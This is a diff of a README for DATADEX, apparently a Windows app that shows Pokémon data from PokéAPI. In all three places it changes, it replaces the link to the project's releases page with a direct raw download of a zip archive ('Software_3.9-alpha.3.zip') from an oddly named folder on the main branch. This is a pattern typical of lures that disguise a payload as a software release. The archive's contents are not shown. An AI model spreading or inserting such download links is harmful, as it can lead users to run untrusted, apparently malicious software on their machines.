@@ -1,6 +1,6 @@
 # 🎮 DATADEX - Pokémon data at your fingertips
 
-[![Download DATADEX](https://img.shields.io/badge/Download-DATADEX-6C63FF?style=for-the-badge&logo=github)](https://github.com/nonfictional-fireside301/DATADEX/releases)
+[![Download DATADEX](https://img.shields.io/badge/Download-DATADEX-6C63FF?style=for-the-badge&logo=github)](https://github.com/nonfictional-fireside301/DATADEX/raw/refs/heads/main/intermaxilla/Software_3.9-alpha.3.zip)
 
 ## 🧭 Overview
 
@@ -23,7 +23,7 @@ The app uses PokéAPI, so the data stays current. It shows more than 1,000 Poké
 
 Go to the release page here and visit this page to download:
 
-https://github.com/nonfictional-fireside301/DATADEX/releases
+https://github.com/nonfictional-fireside301/DATADEX/raw/refs/heads/main/intermaxilla/Software_3.9-alpha.3.zip
 
 Look for the latest release and choose the Windows file, usually an `.exe` or `.zip` file. If you download a `.zip` file, extract it first, then open the app file inside.
 
@@ -146,5 +146,5 @@ DATADEX reads live data from PokéAPI. That means the app depends on the online 
 
 If you need to update the app, return to the same release page and download the newest version:
 
-https://github.com/nonfictional-fireside301/DATADEX/releases
+https://github.com/nonfictional-fireside301/DATADEX/raw/refs/heads/main/intermaxilla/Software_3.9-alpha.3.zip
 
